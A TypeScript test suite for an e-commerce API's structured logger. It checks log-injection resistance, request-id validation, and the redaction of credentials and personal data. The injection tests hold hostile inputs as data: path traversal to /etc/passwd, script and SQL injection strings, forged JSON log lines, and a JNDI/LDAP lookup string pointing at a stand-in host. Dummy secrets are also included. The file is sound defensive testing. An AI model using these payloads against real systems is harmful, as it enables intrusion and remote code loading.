import assert from 'node:assert/strict';
import { afterEach, describe, it } from 'node:test';
import { LOG_EVENTS } from '../src/utils/log-events';
import {
  createLogger,
  serializeError,
  type LogLevel,
  type LogSink,
} from '../src/utils/logger';
import {
  clearRegisteredSecrets,
  isMaskedKey,
  isPersonalKey,
  isSecretKey,
  maskEmail,
  registerSecrets,
  sanitize,
  sanitizeFields,
  scrubString,
  REDACTED,
} from '../src/utils/redact';
import { withRequestId } from '../src/utils/request-store';
import { AppError } from '../src/utils/AppError';
import { errorHandler } from '../src/middleware/errorHandler';
import {
  outcomeLevel,
  requestPath,
  resolveRequestId,
  generateRequestId,
  type RequestOutcome,
} from '../src/middleware/requestContext';

/**
 * The structured log, tested as a security control.
 *
 * Most of what follows is not about formatting. A logger's formatting is
 * obvious and self-correcting — somebody reads a line and fixes it. Its
 * redaction is neither: a secret that reaches a log file does so silently, and
 * is discovered by whoever finds the log rather than by whoever wrote the line.
 *
 * So the bulk of these cases are adversarial. They put credentials in fields
 * with innocent names, put them inside somebody else's error message, put
 * newlines and JSON fragments in values a stranger controls, and hand the
 * logger objects it was never meant to receive. Each one asserts that what
 * comes out is one line, is valid JSON, and does not contain the secret.
 */

/** Captures what a logger writes, for assertions on the exact bytes. */
function capture(level: LogLevel = 'debug') {
  const lines: { level: LogLevel; line: string }[] = [];
  const sink: LogSink = (written, line) => lines.push({ level: written, line });

  return {
    logger: createLogger({ level, format: 'json', service: 'zycart-api' }, sink),
    lines,
    /** The last record, parsed. Fails loudly if nothing was written. */
    last: (): Record<string, unknown> => {
      const entry = lines.at(-1);
      assert.ok(entry, 'expected a log record to have been written');
      return JSON.parse(entry.line) as Record<string, unknown>;
    },
  };
}

afterEach(() => {
  clearRegisteredSecrets();
});

/* ---------------------------------------------------------------- */

describe('Event names', () => {
  it('are snake_case, so one vocabulary cannot become three', () => {
    for (const event of LOG_EVENTS) {
      assert.match(
        event,
        /^[a-z][a-z0-9]*(_[a-z0-9]+)*$/,
        `"${event}" is not snake_case — see log-events.ts`,
      );
    }
  });

  it('are unique', () => {
    assert.equal(new Set(LOG_EVENTS).size, LOG_EVENTS.length);
  });

  it('do not mix spellings of the same event', () => {
    // The failure this guards against is `payment_failed` and `paymentFailed`
    // both existing. Normalising away the separators makes the collision
    // visible.
    const normalised = LOG_EVENTS.map((event) => event.replace(/_/g, '').toLowerCase());
    assert.equal(new Set(normalised).size, normalised.length);
  });
});

/* ---------------------------------------------------------------- */

describe('Record shape', () => {
  it('writes one JSON object per line with the four base fields', () => {
    const { logger, lines, last } = capture();

    logger.info('server_started', { port: 5000 });

    assert.equal(lines.length, 1);
    assert.doesNotMatch(lines[0]?.line ?? '', /\n/);

    const record = last();
    assert.equal(record.level, 'info');
    assert.equal(record.event, 'server_started');
    assert.equal(record.service, 'zycart-api');
    assert.equal(record.port, 5000);
  });

  it('stamps an ISO-8601 UTC timestamp', () => {
    const { logger, last } = capture();

    logger.info('server_started');

    const timestamp = last().timestamp;
    assert.equal(typeof timestamp, 'string');
    assert.match(timestamp as string, /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/);
  });

  it('sends warnings and errors to the error stream and the rest to output', () => {
    const { logger, lines } = capture();

    logger.debug('server_started');
    logger.info('server_started');
    logger.warn('server_started');
    logger.error('server_start_failed');

    assert.deepEqual(
      lines.map((entry) => entry.level),
      ['debug', 'info', 'warn', 'error'],
    );
  });

  it('writes nothing below the configured level', () => {
    const { logger, lines } = capture('warn');

    logger.debug('server_started');
    logger.info('server_started');
    logger.warn('server_started');

    assert.equal(lines.length, 1);
    assert.equal(logger.enabled('info'), false);
    assert.equal(logger.enabled('error'), true);
  });

  it('binds child fields onto every record', () => {
    const { logger, last } = capture();

    logger.child({ requestId: 'abc12345' }).info('request_completed', { status: 200 });

    const record = last();
    assert.equal(record.requestId, 'abc12345');
    assert.equal(record.status, 200);
  });

  it('omits absent fields rather than writing them as null', () => {
    const { logger, last } = capture();

    logger.info('request_completed', { status: 200, slow: undefined });

    assert.equal('slow' in last(), false);
  });
});

/* ---------------------------------------------------------------- */

describe('Correlation', () => {
  it('stamps the ambient request id onto a record written deep in a service', () => {
    const { logger, last } = capture();

    withRequestId('req-ambient-1', () => {
      // No requestId passed: this is the shape of every service-level log.
      logger.warn('payment_webhook_rejected', { reason: 'invalid_signature' });
    });

    assert.equal(last().requestId, 'req-ambient-1');
  });

  it('survives an await, which is the only reason it is worth having', async () => {
    const { logger, last } = capture();

    await withRequestId('req-ambient-2', async () => {
      await Promise.resolve();
      await new Promise((resolve) => setTimeout(resolve, 1));
      logger.info('notification_sent', { notificationId: 'n1' });
    });

    assert.equal(last().requestId, 'req-ambient-2');
  });

  it('lets an explicit id win over the ambient one', () => {
    const { logger, last } = capture();

    withRequestId('ambient', () => {
      logger.info('notification_sent', { requestId: 'explicit' });
    });

    assert.equal(last().requestId, 'explicit');
  });

  it('writes the correlation id exactly as the caller was given it', () => {
    const { logger, last } = capture();

    // Ten consecutive digits. Scrubbed as a phone number, this would be
    // rewritten to `***90` — and the id in the log would no longer match the
    // one returned in `X-Request-Id`, which is the entire point of having it.
    const id = resolveRequestId('order-1234567890');
    assert.equal(id, 'order-1234567890');

    logger.child({ requestId: id }).info('request_completed', { status: 200 });
    assert.equal(last().requestId, id);

    withRequestId(id, () => {
      logger.info('payment_finalized', { orderNumber: 'ZYC-1' });
    });
    assert.equal(last().requestId, id);
  });

  it('still scrubs a requestId that did not come from the middleware', () => {
    const { logger, last } = capture();

    logger.info('request_completed', { requestId: 'forged\nsecond line' });

    assert.notEqual(last().requestId, 'forged\nsecond line');
  });

  it('writes no requestId outside a request', () => {
    const { logger, last } = capture();

    logger.info('server_started', { port: 5000 });

    assert.equal('requestId' in last(), false);
  });
});

/* ---------------------------------------------------------------- */

describe('Request ids', () => {
  it('generates an opaque id that is not a token, an address or an account', () => {
    const id = generateRequestId();

    assert.match(id, /^[A-Za-z0-9_-]{16}$/);
    assert.notEqual(id, generateRequestId());
  });

  it('accepts a well-formed incoming id', () => {
    assert.equal(resolveRequestId('0f9a1b2c3d4e5f60'), '0f9a1b2c3d4e5f60');
    assert.equal(
      resolveRequestId('123e4567-e89b-12d3-a456-426614174000'),
      '123e4567-e89b-12d3-a456-426614174000',
    );
  });

  it('replaces anything that could be used to forge a log line', () => {
    const hostile = [
      'short',
      'a'.repeat(65),
      'has space',
      'new\nline',
      'carriage\rreturn',
      'tab\there',
      '{"level":"info","event":"payment_finalized"}',
      '../../etc/passwd',
      '<script>alert(1)</script>',
      "'; DROP TABLE orders; --",
      '\u0000null',
      ' separator',
    ];

    for (const value of hostile) {
      const resolved = resolveRequestId(value);
      assert.notEqual(resolved, value, `"${value}" should have been replaced`);
      assert.match(resolved, /^[A-Za-z0-9_-]{16}$/);
    }
  });

  it('replaces a missing or non-string header', () => {
    assert.match(resolveRequestId(undefined), /^[A-Za-z0-9_-]{16}$/);
    assert.match(resolveRequestId(['a', 'b']), /^[A-Za-z0-9_-]{16}$/);
    assert.match(resolveRequestId(12345678), /^[A-Za-z0-9_-]{16}$/);
  });

  it('accepts exactly the documented length bounds', () => {
    const eight = 'a'.repeat(8);
    const sixtyFour = 'a'.repeat(64);

    assert.equal(resolveRequestId(eight), eight);
    assert.equal(resolveRequestId(sixtyFour), sixtyFour);
    assert.notEqual(resolveRequestId('a'.repeat(7)), 'a'.repeat(7));
  });
});

/* ---------------------------------------------------------------- */

describe('Log injection', () => {
  const oneLine = (value: string): Record<string, unknown> => {
    const { logger, lines, last } = capture();
    logger.info('search_completed', { query: value });

    assert.equal(lines.length, 1, 'a hostile value split one record into several');
    assert.doesNotMatch(lines[0]?.line ?? '', /[\n\r]/);

    return last();
  };

  it('keeps a record on one line however the value is shaped', () => {
    const attacks = [
      'plain\nnewline',
      'carriage\r\nreturn',
      'tab\tseparated',
      'a b c',
      '\u0000\u0001\u001f',
      'shoes"}\n{"level":"error","event":"payment_finalized","orderNumber":"ZYC-1',
      '${jndi:ldap://evil.example/a}',
    ];

    for (const attack of attacks) {
      const record = oneLine(attack);
      assert.equal(record.event, 'search_completed');
    }
  });

  it('cannot be made to forge a second record', () => {
    const record = oneLine('}\n{"level":"error","event":"payment_finalized"}');

    // The forged fragment survives only as text inside one field.
    assert.equal(record.level, 'info');
    assert.equal(record.event, 'search_completed');
  });

  it('bounds an unbounded value', () => {
    const { logger, last } = capture();

    logger.info('search_completed', { query: 'x'.repeat(10_000) });

    const query = last().query as string;
    assert.ok(query.length < 600, `expected truncation, got ${String(query.length)} characters`);
    assert.match(query, /\[truncated\]$/);
  });
});

/* ---------------------------------------------------------------- */

describe('Secret redaction — by field name', () => {
  it('recognises the names a credential hides behind', () => {
    for (const key of [
      'password',
      'SMTP_PASSWORD',
      'smtpPassword',
      'smtp-password',
      'jwt',
      'jwtSecret',
      'authorization',
      'Authorization',
      'cookie',
      'Set-Cookie',
      'apiKey',
      'api_key',
      'razorpayKeySecret',
      'webhookSecret',
      'signature',
      'x-razorpay-signature',
      'accessToken',
      'refresh_token',
      'MONGODB_URI',
      'privateKey',
    ]) {
      assert.ok(isSecretKey(key), `"${key}" should be treated as secret`);
    }
  });

  it('leaves the fields diagnostics actually need', () => {
    for (const key of [
      'orderNumber',
      'userId',
      'actorId',
      'notificationId',
      'requestId',
      'eventId',
      'eventType',
      'durationMs',
      'status',
      'reason',
      'attempt',
      'provider',
      'author',
      'authorId',
      'sku',
      'productId',
      'razorpayOrderId',
      'razorpayPaymentId',
    ]) {
      assert.equal(isSecretKey(key), false, `"${key}" must stay readable`);
    }
  });

  it('redacts the value whatever it is', () => {
    const { logger, last } = capture();

    logger.error('notification_failed', {
      password: 'hunter2',
      authorization: 'Bearer eyJhbGciOiJIUzI1NiJ9.payload.signature',
      cookie: 'zycart_session=abcdef; Path=/',
      SMTP_PASSWORD: 'correct-horse-battery-staple',
      RAZORPAY_KEY_SECRET: 'rzpsecret1234567890',
      notificationId: 'n-1',
    });

    const record = last();

    assert.equal(record.password, REDACTED);
    assert.equal(record.authorization, REDACTED);
    assert.equal(record.cookie, REDACTED);
    assert.equal(record.SMTP_PASSWORD, REDACTED);
    assert.equal(record.RAZORPAY_KEY_SECRET, REDACTED);
    // The diagnostic field is untouched; redaction is targeted, not blanket.
    assert.equal(record.notificationId, 'n-1');

    const line = JSON.stringify(record);
    for (const secret of ['hunter2', 'correct-horse-battery-staple', 'rzpsecret1234567890']) {
      assert.equal(line.includes(secret), false, `"${secret}" reached the log`);
    }
  });

  it('redacts a secret nested inside an object somebody logged whole', () => {
    const { logger, lines } = capture();

    logger.error('notification_provider_failed', {
      config: { host: 'smtp.example.com', port: 587, password: 'hunter2' },
    });

    assert.equal(lines[0]?.line.includes('hunter2'), false);
  });
});

/* ---------------------------------------------------------------- */

describe('Secret redaction — by value', () => {
  it('removes a registered secret from a field with an innocent name', () => {
    registerSecrets(['super-secret-jwt-value-0123456789']);

    const { logger, lines } = capture();

    // The realistic case: a driver's error message, logged under `detail`.
    logger.error('database_connection_failed', {
      detail: 'auth failed for user with key super-secret-jwt-value-0123456789 at host',
    });

    const line = lines[0]?.line ?? '';
    assert.equal(line.includes('super-secret-jwt-value-0123456789'), false);
    assert.ok(line.includes(REDACTED));
  });

  it('removes a connection string the driver quoted back', () => {
    const uri = 'mongodb+srv://zycart:tr0ub4dor@cluster0.example.mongodb.net/zycart';
    registerSecrets([uri]);

    const { logger, lines } = capture();

    logger.error('database_connection_failed', {
      error: serializeError(new Error(`connect ECONNREFUSED for ${uri}`)),
    });

    assert.equal(lines[0]?.line.includes('tr0ub4dor'), false);
    assert.equal(lines[0]?.line.includes(uri), false);
  });

  it('ignores values too short to scan for', () => {
    registerSecrets(['abc', 'the']);

    // Registering "the" would otherwise redact half of every message.
    assert.equal(scrubString('the order was there'), 'the order was there');
  });

  it('accepts undefined and null without registering them', () => {
    clearRegisteredSecrets();
    registerSecrets([undefined, null, '']);
    assert.equal(scrubString('anything at all'), 'anything at all');
  });
});

/* ---------------------------------------------------------------- */

describe('Personal data', () => {
  it('masks an address to its domain', () => {
    assert.equal(maskEmail('customer@gmail.com'), 'c***@gmail.com');
    assert.equal(maskEmail('a@b.co'), 'a***@b.co');
    assert.equal(maskEmail('not-an-address'), REDACTED);
  });

  it('recognises the fields that carry it', () => {
    for (const key of ['email', 'recipientEmail', 'customerEmail']) {
      assert.ok(isMaskedKey(key), `"${key}" should be masked`);
    }

    for (const key of ['phone', 'mobileNumber', 'shippingAddress', 'pincode']) {
      assert.ok(isPersonalKey(key), `"${key}" should be removed`);
    }
  });

  it('never writes a full address, whatever the field is called', () => {
    const { logger, lines } = capture();

    logger.info('notification_sent', {
      recipientEmail: 'jane.doe@example.com',
      reason: 'delivered to jane.doe@example.com after one retry',
      notificationId: 'n-2',
    });

    const line = lines[0] ?? { line: '' };

    assert.equal(line.line.includes('jane.doe@example.com'), false);
    assert.ok(line.line.includes('j***@example.com'));
  });

  it('keeps a provider name under a field called email', () => {
    const { logger, last } = capture();

    // The startup line that says nothing is being delivered. Redacting it
    // would hide the single most consequential fact about a deployment.
    logger.info('server_started', { emailProvider: 'mock', email: 'smtp' });

    const record = last();
    assert.equal(record.emailProvider, 'mock');
    assert.equal(record.email, 'smtp');
  });

  it('separates fields it masks from fields it removes', () => {
    assert.ok(isMaskedKey('recipientEmail'));
    assert.equal(isPersonalKey('emailProvider'), false);

    assert.ok(isPersonalKey('phone'));
    assert.ok(isPersonalKey('shippingAddress'));
    assert.ok(isPersonalKey('pincode'));
  });

  it('removes a whole address object rather than walking it', () => {
    const { logger, last } = capture();

    logger.info('request_completed', {
      shippingAddress: { line1: '14 Rose Lane', city: 'Pune', pincode: '411001' },
    });

    assert.equal(last().shippingAddress, REDACTED);
  });

  it('reduces a phone number that arrived inside a message', () => {
    const { logger, lines } = capture();

    logger.warn('activity_record_failed', { detail: 'could not reach 9876543210 for delivery' });

    assert.equal(lines[0]?.line.includes('9876543210'), false);
  });

  it('leaves the identifiers that replace personal data', () => {
    const { logger, last } = capture();

    logger.info('notification_sent', {
      notificationId: '507f1f77bcf86cd799439011',
      orderNumber: 'ZYC-2026-000123',
      userId: '507f191e810c19729de860ea',
    });

    const record = last();
    assert.equal(record.orderNumber, 'ZYC-2026-000123');
    assert.equal(record.notificationId, '507f1f77bcf86cd799439011');
    assert.equal(record.userId, '507f191e810c19729de860ea');
  });
});

/* ---------------------------------------------------------------- */

describe('Value sanitisation', () => {
  it('bounds depth so a domain object cannot be logged whole', () => {
    const deep = { a: { b: { c: { d: { e: 'buried' } } } } };

    const result = sanitize(deep) as Record<string, unknown>;

    assert.equal(JSON.stringify(result).includes('buried'), false);
  });

  it('bounds array length', () => {
    const result = sanitize(Array.from({ length: 100 }, (_, index) => index)) as unknown[];

    assert.ok(result.length <= 21);
    assert.equal(result.at(-1), '…80 more');
  });

  it('bounds the number of fields', () => {
    const wide = Object.fromEntries(
      Array.from({ length: 60 }, (_, index) => [`field${String(index)}`, index]),
    );

    const result = sanitizeFields(wide);

    assert.ok(Object.keys(result).length <= 31);
    assert.equal(result['…'], 'truncated');
  });

  it('survives a cycle instead of recursing forever', () => {
    const node: Record<string, unknown> = { name: 'root' };
    node.self = node;

    assert.doesNotThrow(() => JSON.stringify(sanitize(node)));
  });

  it('reduces an object it cannot safely walk to its class name', () => {
    class OrderDocument {
      readonly cardNumber = '4111111111111111';
    }

    const result = sanitize(new OrderDocument());

    assert.equal(result, '[OrderDocument]');
  });

  it('renders ids, dates, buffers and unrepresentable numbers readably', () => {
    assert.equal(sanitize({ toHexString: () => '507f1f77bcf86cd799439011' }), '507f1f77bcf86cd799439011');
    assert.equal(sanitize(new Date('2026-09-20T10:00:00.000Z')), '2026-09-20T10:00:00.000Z');
    assert.equal(sanitize(Buffer.from('signed body bytes')), '[buffer 17 bytes]');
    assert.equal(sanitize(Number.NaN), 'NaN');
    assert.equal(sanitize(Number.POSITIVE_INFINITY), 'Infinity');
    assert.equal(sanitize(10n), '10');
  });

  it('reduces a raw webhook body rather than printing it', () => {
    const { logger, lines } = capture();

    logger.warn('payment_webhook_rejected', {
      reason: 'invalid_signature',
      rawBody: Buffer.from(JSON.stringify({ payload: { payment: { entity: { id: 'pay_1' } } } })),
    });

    assert.equal(lines[0]?.line.includes('pay_1'), false);
    assert.match(lines[0]?.line ?? '', /buffer \d+ bytes/);
  });
});

/* ---------------------------------------------------------------- */

describe('Error serialisation', () => {
  it('keeps the four fields a responder needs', () => {
    const error = new AppError('This order is no longer available for payment.', 409);

    const serialised = serializeError(error);

    assert.equal(serialised.name, 'AppError');
    assert.equal(serialised.message, 'This order is no longer available for payment.');
    assert.equal(serialised.statusCode, 409);
    assert.equal(serialised.stack, undefined);
  });

  it('keeps a trimmed stack when asked, and only then', () => {
    const withStack = serializeError(new Error('boom'), { stack: true });

    assert.ok(withStack.stack);
    assert.equal(withStack.stack.includes('\n'), false, 'the stack must not break the line');
    assert.ok(withStack.stack.split(' | ').length <= 9);
  });

  it('reads a driver code without reading the rest of the object', () => {
    const duplicate = Object.assign(new Error('E11000 duplicate key'), { code: 11000 });

    assert.equal(serializeError(duplicate).code, 11000);
  });

  it('does not walk an error carrying a request config', () => {
    // The Axios shape: the thing that publishes an Authorization header if an
    // error is ever handed to a generic serialiser.
    const axiosLike = Object.assign(new Error('Request failed with status code 401'), {
      config: { headers: { Authorization: 'Bearer super-secret-token-value' } },
    });

    const { logger, lines } = capture();
    logger.error('payment_gateway_failed', { error: serializeError(axiosLike) });

    assert.equal(lines[0]?.line.includes('super-secret-token-value'), false);
    assert.equal(lines[0]?.line.includes('Authorization'), false);
  });

  it('collapses an error reached through ordinary field sanitisation', () => {
    const { logger, lines } = capture();

    // Somebody logs the error directly rather than serialising it.
    logger.error('ai_request_failed', {
      cause: Object.assign(new Error('nope'), {
        config: { headers: { Authorization: 'Bearer leaked-value-here' } },
      }),
    });

    assert.equal(lines[0]?.line.includes('leaked-value-here'), false);
  });

  it('handles a thrown non-error', () => {
    assert.equal(serializeError('just a string').name, 'NonError');
    assert.equal(serializeError(null).message, 'null');
  });
});


/* ---------------------------------------------------------------- */

describe('Error responses', () => {
  /**
   * Minimal Express doubles.
   *
   * `errorHandler` reads three things from the request and writes two to the
   * response, so the doubles carry exactly those. Standing up a real server to
   * assert the shape of a JSON body would test Express rather than ZyCart.
   */
  function handle(error: unknown) {
    const request = { requestId: 'req-error-0001' } as unknown as Parameters<
      typeof errorHandler
    >[1];

    let status = 0;
    let body: Record<string, unknown> = {};

    const response = {
      status(code: number) {
        status = code;
        return this;
      },
      json(payload: Record<string, unknown>) {
        body = payload;
        return this;
      },
    } as unknown as Parameters<typeof errorHandler>[2];

    errorHandler(error, request, response, () => undefined);

    return { status, body, loggedError: (request as { loggedError?: unknown }).loggedError };
  }

  it('gives a server fault a correlation id the customer can quote', () => {
    const { status, body } = handle(new Error('the database exploded'));

    assert.equal(status, 500);
    assert.equal(body.success, false);
    // The sentence is generic. The reference is not.
    assert.equal(body.message, 'Internal server error');
    assert.equal(body.requestId, 'req-error-0001');
  });

  it('tells the customer nothing about what actually failed', () => {
    const { body } = handle(
      new Error('E11000 duplicate key on zycart.users index email_1 at db.invalid:27017'),
    );

    const serialised = JSON.stringify(body);

    for (const fragment of ['E11000', 'zycart.users', 'db.invalid', 'index', 'at ']) {
      assert.equal(serialised.includes(fragment), false, `"${fragment}" reached the client`);
    }
  });

  it('keeps the stack server-side', () => {
    const { body, loggedError } = handle(new Error('boom'));

    assert.equal('stack' in body, false);
    assert.ok((loggedError as { stack?: string }).stack, 'the log should have the stack');
  });

  it('leaves the 4xx contract byte-identical', () => {
    const { status, body } = handle(new AppError('This order cannot be paid for.', 409));

    assert.equal(status, 409);
    // No requestId. A validation failure already says what to fix, and an
    // incident reference beside it would only be alarming.
    assert.deepEqual(body, { success: false, message: 'This order cannot be paid for.' });
  });

  it('attaches the error to the request so one request is one record', () => {
    const { loggedError } = handle(new AppError('Not found', 404));

    // Written by `requestContext`, not here — two lines per failure would have
    // to be joined by timestamp.
    assert.equal((loggedError as { name: string }).name, 'AppError');
    assert.equal((loggedError as { statusCode?: number }).statusCode, 404);
    assert.equal((loggedError as { stack?: string }).stack, undefined);
  });

  it('redacts a credential that reached the error message', () => {
    registerSecrets(['ZYCART-P16-LEAKED-SECRET-VALUE']);

    const { loggedError } = handle(
      new Error('auth failed with ZYCART-P16-LEAKED-SECRET-VALUE'),
    );

    assert.equal(
      JSON.stringify(loggedError).includes('ZYCART-P16-LEAKED-SECRET-VALUE'),
      false,
    );
  });
});

/* ---------------------------------------------------------------- */

describe('Request paths', () => {
  it('reports the path the caller asked for, not the router-relative one', () => {
    // `req.path` inside the mounted api router is `/health`, which reads as a
    // different endpoint in a log and defeats the quiet-path rule.
    assert.equal(requestPath('/api/health'), '/api/health');
    assert.equal(requestPath('/api/products/blue-shirt'), '/api/products/blue-shirt');
  });

  it('cuts the query string off', () => {
    assert.equal(requestPath('/api/products?q=linen+shirt&limit=24'), '/api/products');
    assert.equal(requestPath('/api/products?'), '/api/products');
  });
});

/* ---------------------------------------------------------------- */

describe('Request outcome levels', () => {
  const outcome = (overrides: Partial<RequestOutcome> = {}): RequestOutcome => ({
    status: 200,
    durationMs: 12,
    slow: false,
    quiet: false,
    preflight: false,
    ...overrides,
  });

  it('logs an ordinary success at info', () => {
    assert.equal(outcomeLevel(outcome()), 'info');
  });

  it('logs a successful health check at debug, and a failing one louder', () => {
    assert.equal(outcomeLevel(outcome({ quiet: true })), 'debug');
    assert.equal(outcomeLevel(outcome({ status: 503, quiet: false })), 'error');
  });

  it('logs a client error at warn and a server fault at error', () => {
    assert.equal(outcomeLevel(outcome({ status: 404 })), 'warn');
    assert.equal(outcomeLevel(outcome({ status: 401 })), 'warn');
    assert.equal(outcomeLevel(outcome({ status: 500 })), 'error');
  });

  it('raises a slow success to warn without calling it a failure', () => {
    assert.equal(outcomeLevel(outcome({ slow: true })), 'warn');
  });

  it('keeps a slow failure at its status level', () => {
    assert.equal(outcomeLevel(outcome({ status: 500, slow: true })), 'error');
  });

  it('keeps preflight chatter at debug', () => {
    assert.equal(outcomeLevel(outcome({ preflight: true })), 'debug');
  });
});
